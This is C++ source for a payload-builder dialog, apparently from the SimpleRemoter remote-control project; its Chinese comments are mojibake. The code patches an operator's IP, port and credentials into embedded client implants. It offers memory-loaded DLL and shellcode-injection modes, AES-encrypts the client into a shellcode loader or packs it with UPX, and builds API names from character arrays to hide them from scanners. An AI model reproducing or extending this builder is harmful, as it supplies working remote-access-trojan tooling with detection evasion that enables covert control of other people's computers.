// BuildDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "2015Remote.h"
#include "BuildDlg.h"
#include "afxdialogex.h"
#include <io.h>
#include "InputDlg.h"
#include <bcrypt.h>
#include <wincrypt.h>
#include <ntstatus.h>

enum Index
{
	IndexTestRun_DLL,
	IndexTestRun_MemDLL,
	IndexTestRun_InjSC,
	IndexGhost,
	IndexServerDll,
	OTHER_ITEM
};

// CBuildDlg �Ի���

IMPLEMENT_DYNAMIC(CBuildDlg, CDialog)

std::string GetMasterId();

std::string GetPwdHash();

int MemoryFind(const char *szBuffer, const char *Key, int iBufferSize, int iKeySize);

LPBYTE ReadResource(int resourceId, DWORD &dwSize) {
	dwSize = 0;
	auto id = resourceId;
	HRSRC hResource = FindResourceA(NULL, MAKEINTRESOURCE(id), "BINARY");
	if (hResource == NULL) {
		return NULL;
	}
	// ��ȡ��Դ�Ĵ�С
	dwSize = SizeofResource(NULL, hResource);

	// ������Դ
	HGLOBAL hLoadedResource = LoadResource(NULL, hResource);
	if (hLoadedResource == NULL) {
		return NULL;
	}
	// ������Դ����ȡָ����Դ���ݵ�ָ��
	LPVOID pData = LockResource(hLoadedResource);
	if (pData == NULL) {
		return NULL;
	}
	auto r = new BYTE[dwSize];
	memcpy(r, pData, dwSize);

	return r;
}


CBuildDlg::CBuildDlg(CWnd* pParent)
	: CDialog(CBuildDlg::IDD, pParent)
	, m_strIP(_T(""))
	, m_strPort(_T(""))
	, m_strFindden(FLAG_FINDEN)
{

}

CBuildDlg::~CBuildDlg()
{
}

void CBuildDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_EDIT_IP, m_strIP);
	DDX_Text(pDX, IDC_EDIT_PORT, m_strPort);
	DDX_Control(pDX, IDC_COMBO_EXE, m_ComboExe);
	DDX_Control(pDX, IDC_STATIC_OTHER_ITEM, m_OtherItem);
	DDX_Control(pDX, IDC_COMBO_BITS, m_ComboBits);
	DDX_Control(pDX, IDC_COMBO_RUNTYPE, m_ComboRunType);
	DDX_Control(pDX, IDC_COMBO_PROTO, m_ComboProto);
	DDX_Control(pDX, IDC_COMBO_ENCRYPT, m_ComboEncrypt);
	DDX_Control(pDX, IDC_COMBO_COMPRESS, m_ComboCompress);
}


BEGIN_MESSAGE_MAP(CBuildDlg, CDialog)
	ON_BN_CLICKED(IDOK, &CBuildDlg::OnBnClickedOk)
	ON_CBN_SELCHANGE(IDC_COMBO_EXE, &CBuildDlg::OnCbnSelchangeComboExe)
	ON_COMMAND(ID_HELP_PARAMETERS, &CBuildDlg::OnHelpParameters)
	ON_COMMAND(ID_HELP_FINDDEN, &CBuildDlg::OnHelpFindden)
END_MESSAGE_MAP()


// CBuildDlg ��Ϣ�������

std::string ReleaseUPX();
void run_upx_async(HWND hwnd, const std::string& upx, const std::string& file, bool isCompress);

bool MakeShellcode(LPBYTE& compressedBuffer, int& ulTotalSize, LPBYTE originBuffer,
	int ulOriginalLength, bool align = false);

BOOL WriteBinaryToFile(const char* path, const char* data, ULONGLONG size);

std::string ReleaseEXE(int resID, const char* name) {
	DWORD dwSize = 0;
	LPBYTE data = ReadResource(resID, dwSize);
	if (!data)
		return "";

	char path[MAX_PATH];
	DWORD len = GetModuleFileNameA(NULL, path, MAX_PATH);
	std::string curExe = path;
	GET_FILEPATH(path, name);
	BOOL r = WriteBinaryToFile(path, (char*)data, dwSize);
	SAFE_DELETE_ARRAY(data);

	return r ? path : "";
}

typedef struct SCInfo
{
	unsigned char aes_key[16];
	unsigned char aes_iv[16];
	unsigned char data[4 * 1024 * 1024];
	int len;
}SCInfo;

#define GetAddr(mod, name) GetProcAddress(GetModuleHandleA(mod), name)

bool MYLoadLibrary(const char* name) {
	char kernel[] = { 'k','e','r','n','e','l','3','2',0 };
	char load[] = { 'L','o','a','d','L','i','b','r','a','r','y','A',0 };
	typedef HMODULE(WINAPI* LoadLibraryF)(LPCSTR lpLibFileName);
	if (!GetModuleHandleA(name)) {
		LoadLibraryF LoadLibraryA = (LoadLibraryF)GetAddr(kernel, load);
		return LoadLibraryA(name);
	}
	return true;
}

void generate_random_iv(unsigned char* iv, size_t len) {
	typedef HMODULE(WINAPI* LoadLibraryF)(LPCSTR lpLibFileName);
	typedef NTSTATUS(WINAPI* BCryptGenRandomF)(BCRYPT_ALG_HANDLE, PUCHAR, ULONG, ULONG);
	char crypt[] = { 'b','c','r','y','p','t',0 };
	char name[] = { 'B','C','r','y','p','t','G','e','n','R','a','n','d','o','m',0 };
	MYLoadLibrary(crypt);
	BCryptGenRandomF BCryptGenRandom = (BCryptGenRandomF)GetAddr(crypt, name);
	BCryptGenRandom(NULL, iv, len, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
}

void CBuildDlg::OnBnClickedOk()
{
	UpdateData(TRUE);
	if (m_strIP.IsEmpty() || atoi(m_strPort) <= 0)
		return;

	BYTE* szBuffer = NULL;
	DWORD dwFileSize = 0;
	int index = m_ComboExe.GetCurSel(), typ=index;
	int is64bit = m_ComboBits.GetCurSel() == 0;
	if (index == IndexTestRun_InjSC && !is64bit) {
		MessageBox("Shellcode ֻ����64λ���±�ע�룬ע����Ҳֻ����64λ!", "��ʾ", MB_ICONWARNING);
		return;
	}
	int startup = Startup_DLL;
	CString file;
	switch (index)
	{
	case IndexTestRun_DLL: case IndexTestRun_MemDLL: case IndexTestRun_InjSC:
		file = "TestRun.exe";
		typ = index == IndexTestRun_DLL ? CLIENT_TYPE_DLL : CLIENT_TYPE_MEMDLL;
		startup = std::map<int, int>{ 
			{IndexTestRun_DLL, Startup_DLL},{IndexTestRun_MemDLL, Startup_MEMDLL},{IndexTestRun_InjSC, Startup_InjSC},
		}[index];
		szBuffer = ReadResource(is64bit ? IDR_TESTRUN_X64 : IDR_TESTRUN_X86, dwFileSize);
		break;
	case IndexGhost:
		file = "ghost.exe";
		typ = CLIENT_TYPE_ONE;
		szBuffer = ReadResource(is64bit ? IDR_GHOST_X64 : IDR_GHOST_X86, dwFileSize);
		break;
	case IndexServerDll:
		file = "ServerDll.dll";
		typ = CLIENT_TYPE_DLL;
		szBuffer = ReadResource(is64bit ? IDR_SERVERDLL_X64 : IDR_SERVERDLL_X86, dwFileSize);
		break;
	case OTHER_ITEM: {
		m_OtherItem.GetWindowTextA(file);
		typ = -1;
		if (file != "δѡ���ļ�") {
			CFile File;
			File.Open(file, CFile::modeRead | CFile::typeBinary);
			dwFileSize = File.GetLength();
			if (dwFileSize > 0) {
				szBuffer = new BYTE[dwFileSize];
				File.Read(szBuffer, dwFileSize);
			}
			File.Close();
		}
		break;
	}
	default:
		break;
	}
	if (szBuffer == NULL)
	{
		MessageBox("�����ڲ������������룬���±������!", "��ʾ", MB_ICONWARNING);
		return;
	}
	//////////������Ϣ//////////////////////
	CONNECT_ADDRESS g_ConnectAddress = { FLAG_FINDEN, "127.0.0.1", "", typ, false, DLL_VERSION, 0, startup, HeaderEncV0 };
	if(m_strFindden.GetLength())
		memcpy(g_ConnectAddress.szFlag, m_strFindden.GetBuffer(), min(sizeof(g_ConnectAddress.szFlag), m_strFindden.GetLength()));
	g_ConnectAddress.SetAdminId(GetMasterHash().c_str());
	g_ConnectAddress.SetServer(m_strIP, atoi(m_strPort));
	g_ConnectAddress.runningType = m_ComboRunType.GetCurSel();
	g_ConnectAddress.protoType = m_ComboProto.GetCurSel();
	g_ConnectAddress.iHeaderEnc = m_ComboEncrypt.GetCurSel();
	memcpy(g_ConnectAddress.pwdHash, GetPwdHash().c_str(), sizeof(g_ConnectAddress.pwdHash));

	if (!g_ConnectAddress.IsValid()) {
		SAFE_DELETE_ARRAY(szBuffer);
		return;
	}
	if (startup != Startup_InjSC)
		g_ConnectAddress.Encrypt();
	try
	{
		// ���±�ʶ
		char* ptr = (char*)szBuffer, *end = (char*)szBuffer + dwFileSize;
		bool bFind = false;
		int bufSize = dwFileSize;
		while (ptr < end) {
			int iOffset = MemoryFind(ptr, (char*)g_ConnectAddress.Flag(), bufSize, g_ConnectAddress.FlagLen());
			if (iOffset == -1)
				break;

			CONNECT_ADDRESS* dst = (CONNECT_ADDRESS*)(ptr + iOffset);
			auto result = strlen(dst->szBuildDate) ? compareDates(dst->szBuildDate, g_ConnectAddress.szBuildDate) : -1;
			if (result > 0) {
				MessageBox("�ͻ��˰汾�����س������, �޷�����!\r\n" + file, "��ʾ", MB_ICONWARNING);
				return;
			}
			if (result != -2 && result <= 0)// �ͻ��˰汾���ܲ��������ض�
			{
				bFind = true;
				auto master = GetMasterId();
				memcpy(ptr + iOffset, &(g_ConnectAddress.ModifyFlag(master.c_str())), sizeof(g_ConnectAddress));
			}
			ptr += iOffset + sizeof(g_ConnectAddress);
			bufSize -= iOffset + sizeof(g_ConnectAddress);
		}
		if (!bFind) {
			MessageBox("�����ڲ�����δ���ҵ���ʶ��Ϣ!\r\n" + file, "��ʾ", MB_ICONWARNING);
			SAFE_DELETE_ARRAY(szBuffer);
			return;
		}

		// �����ļ�
		char path[_MAX_PATH], * p = path;
		GetModuleFileNameA(NULL, path, sizeof(path));
		while (*p) ++p;
		while ('\\' != *p) --p;
		strcpy(p + 1, file.GetString());

		CString strSeverFile = typ != -1 ? path : file;
		DeleteFileA(strSeverFile);
		CFile File;
		BOOL r=File.Open(strSeverFile,CFile::typeBinary|CFile::modeCreate|CFile::modeWrite);
		if (!r) {
			MessageBox("������򴴽�ʧ��!\r\n" + strSeverFile, "��ʾ", MB_ICONWARNING);
			SAFE_DELETE_ARRAY(szBuffer);
			return;
		}
		File.Write(szBuffer, dwFileSize);
		File.Close();
		CString tip = index == IndexTestRun_DLL ? "\r\n��ʾ: ������\"ServerDll.dll\"���Ա�����������С�" : "";
		tip += g_ConnectAddress.protoType==PROTO_KCP ? "\n��ʾ: ʹ��KCPЭ�����ɷ��񣬱�����������UDPЭ�����Ϊ1��" : "";
		std::string upx;
		if(m_ComboCompress.GetCurSel() == CLIENT_COMPRESS_UPX) upx = ReleaseUPX();
		if (!upx.empty())
		{
			run_upx_async(GetParent()->GetSafeHwnd(), upx, strSeverFile.GetString(), true);
			MessageBox("����UPXѹ�������ע��Ϣ��ʾ��\r\n�ļ�λ��: " + strSeverFile + tip, "��ʾ", MB_ICONINFORMATION);
		} else {
			if (m_ComboCompress.GetCurSel() == CLIENT_COMPRESS_SC) {
				DWORD dwSize = 0;
				LPBYTE data = ReadResource(is64bit ? IDR_SCLOADER_X64 : IDR_SCLOADER_X86, dwSize);
				if (data) {
					int iOffset = MemoryFind((char*)data, (char*)g_ConnectAddress.Flag(), dwSize, g_ConnectAddress.FlagLen());
					if (iOffset != -1) {
						SCInfo* sc = (SCInfo*)(data + iOffset);
						LPBYTE srcData = (LPBYTE)szBuffer;
						int srcLen = dwFileSize;
						if (MakeShellcode(srcData, srcLen, (LPBYTE)szBuffer, dwFileSize, true)) {
							generate_random_iv(sc->aes_key, 16);
							generate_random_iv(sc->aes_iv, 16);
							std::string key, iv;
							for (int i = 0; i < 16; ++i) key += std::to_string(sc->aes_key[i]) + " ";
							for (int i = 0; i < 16; ++i) iv += std::to_string(sc->aes_iv[i]) + " ";
							Mprintf("AES_KEY: %s, AES_IV: %s\n", key.c_str(), iv.c_str());

							struct AES_ctx ctx;
							AES_init_ctx_iv(&ctx, sc->aes_key, sc->aes_iv);
							AES_CBC_encrypt_buffer(&ctx, srcData, srcLen);
							if (srcLen <= 4 * 1024 * 1024) {
								memcpy(sc->data, srcData, srcLen);
								sc->len = srcLen;
							}
							SAFE_DELETE_ARRAY(srcData);
							PathRenameExtension(strSeverFile.GetBuffer(MAX_PATH), _T(".exe"));
							strSeverFile.ReleaseBuffer();
							BOOL r = WriteBinaryToFile(strSeverFile.GetString(), (char*)data, dwSize);
						}
					}
				}
				SAFE_DELETE_ARRAY(data);
			}
			MessageBox("���ɳɹ�! �ļ�λ��:\r\n" + strSeverFile + tip, "��ʾ", MB_ICONINFORMATION);
		}
		SAFE_DELETE_ARRAY(szBuffer);
		if (index == IndexTestRun_DLL) return;
	}
	catch (CMemoryException* e)
	{
		char err[100];
		e->GetErrorMessage(err, sizeof(err));
		MessageBox("�ڴ��쳣:" + CString(err), "�쳣", MB_ICONERROR);
	}
	catch (CFileException* e)
	{
		char err[100];
		e->GetErrorMessage(err, sizeof(err));
		MessageBox("�ļ��쳣:" + CString(err), "�쳣", MB_ICONERROR);
	}
	catch (CException* e)
	{
		char err[100];
		e->GetErrorMessage(err, sizeof(err));
		MessageBox("�����쳣:" + CString(err), "�쳣", MB_ICONERROR);
	}

	SAFE_DELETE_ARRAY(szBuffer);
	CDialog::OnOK();
}

BOOL CBuildDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  �ڴ���Ӷ���ĳ�ʼ��
	CEdit* pEdit = (CEdit*)GetDlgItem(IDC_EDIT_IP);
	pEdit->LimitText(99);
	m_ComboExe.InsertString(IndexTestRun_DLL, "TestRun - ����DLL");
	m_ComboExe.InsertString(IndexTestRun_MemDLL, "TestRun - �ڴ�DLL");
	m_ComboExe.InsertString(IndexTestRun_InjSC, "TestRun - ע����±�");

	m_ComboExe.InsertString(IndexGhost, "ghost.exe");
	m_ComboExe.InsertString(IndexServerDll, "ServerDll.dll");
	m_ComboExe.InsertString(OTHER_ITEM, CString("ѡ���ļ�"));
	m_ComboExe.SetCurSel(IndexTestRun_MemDLL);

	m_ComboBits.InsertString(0, "64λ");
	m_ComboBits.InsertString(1, "32λ");
	m_ComboBits.SetCurSel(0);

	m_ComboRunType.InsertString(RUNNING_RANDOM, "�������");
	m_ComboRunType.InsertString(RUNNING_PARALLEL, "��������");
	m_ComboRunType.SetCurSel(RUNNING_RANDOM);

	m_ComboProto.InsertString(PROTO_TCP, "TCP");
	m_ComboProto.InsertString(PROTO_UDP, "UDP");
	m_ComboProto.InsertString(PROTO_HTTP, "HTTP");
	m_ComboProto.InsertString(PROTO_RANDOM, "���");
	m_ComboProto.InsertString(PROTO_KCP, "KCP");
	m_ComboProto.SetCurSel(PROTO_TCP);

	m_ComboEncrypt.InsertString(PROTOCOL_SHINE, "Shine");
	m_ComboEncrypt.InsertString(PROTOCOL_HELL, "HELL");
	m_ComboEncrypt.SetCurSel(PROTOCOL_SHINE);

	m_ComboCompress.InsertString(CLIENT_COMPRESS_NONE, "��");
	m_ComboCompress.InsertString(CLIENT_COMPRESS_UPX, "UPX");
	m_ComboCompress.InsertString(CLIENT_COMPRESS_SC, "SHELLCODE");
	m_ComboCompress.SetCurSel(CLIENT_COMPRESS_NONE);

	m_OtherItem.ShowWindow(SW_HIDE);

	return TRUE;  // return TRUE unless you set the focus to a control
				  // �쳣: OCX ����ҳӦ���� FALSE
}

void CBuildDlg::OnCbnSelchangeComboExe()
{
	auto n = m_ComboExe.GetCurSel();
	if (n == OTHER_ITEM)
	{
		CComPtr<IShellFolder> spDesktop;
		HRESULT hr = SHGetDesktopFolder(&spDesktop);
		if (FAILED(hr)) {
			MessageBox("Explorer δ��ȷ��ʼ��! ���Ժ����ԡ�", "��ʾ");
			return;
		}
		// ����������ʾ�����ļ����ض������ļ��������ı��ļ���
		CFileDialog fileDlg(TRUE, _T("dll"), NULL, OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT,
			_T("All Files (*.*)|*.*|DLL Files (*.dll)|*.dll|EXE Files (*.exe)|*.exe|"), AfxGetMainWnd());
		int ret = 0;
		try {
			ret = fileDlg.DoModal();
		}
		catch (...) {
			MessageBox("�ļ��Ի���δ�ɹ���! ���Ժ����ԡ�", "��ʾ");
			return;
		}
		if (ret == IDOK)
		{
			CString name = fileDlg.GetPathName();

			m_OtherItem.SetWindowTextA(name);
			CFile File;
			BOOL ret = File.Open(name, CFile::modeRead | CFile::typeBinary);
			if (ret) {
				int dwFileSize = File.GetLength();
				LPBYTE szBuffer = new BYTE[dwFileSize];
				File.Read(szBuffer, dwFileSize);
				File.Close();
				m_strIP = "127.0.0.1";
				m_strPort = "6543";
				UpdateData(FALSE);
				SAFE_DELETE_ARRAY(szBuffer);
			}
		}
		else {
			m_OtherItem.SetWindowTextA("δѡ���ļ�");
		}
		m_OtherItem.ShowWindow(SW_SHOW);
	}
	else {
		m_OtherItem.SetWindowTextA("");
		m_OtherItem.ShowWindow(SW_HIDE);
	}
}


void CBuildDlg::OnHelpParameters()
{
	CString url = _T("https://github.com/yuanyuanxiang/SimpleRemoter/wiki#���ɲ���");
	ShellExecute(NULL, _T("open"), url, NULL, NULL, SW_SHOWNORMAL);
}


void CBuildDlg::OnHelpFindden()
{
	CInputDialog dlg(this);
	dlg.m_str = m_strFindden;
	dlg.Init("���ɱ�ʶ", "�����ñ�ʶ��Ϣ:");
	if (dlg.DoModal() == IDOK) {
		m_strFindden = dlg.m_str;
	}
}
